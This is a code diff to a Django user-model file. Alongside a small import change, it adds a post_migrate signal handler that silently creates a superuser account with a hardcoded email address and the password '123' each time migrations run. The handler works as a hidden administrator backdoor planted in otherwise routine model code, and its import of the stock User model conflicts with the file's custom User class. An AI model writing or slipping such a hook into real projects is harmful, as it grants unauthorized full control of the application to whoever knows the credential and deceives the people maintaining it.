@@ -1,6 +1,6 @@
 from django.db import models
 from django.contrib.auth.models import (AbstractBaseUser, BaseUserManager, PermissionsMixin)
-from django.db.models.signals import pre_delete
+from django.db.models.signals import pre_delete, post_migrate
 from django.dispatch import receiver
 import os
 from django.utils.translation import gettext_lazy as _
@@ -83,6 +83,13 @@ class User(ImageService, AbstractBaseUser, PermissionsMixin):
 def user_avatar(sender, instance, **kwargs):
     # Pass false so FileField doesn't save the model.
     instance.avatar.delete(False)
+
+
+@receiver(post_migrate)
+def create_superuser(sender, **kwargs):
+    if sender.name == 'auth' and kwargs.get('using') == 'default':
+        from django.contrib.auth.models import User
+        User.objects.create_superuser('interner0206@gmail.com', '123')
 
 
 class Invitation(models.Model):
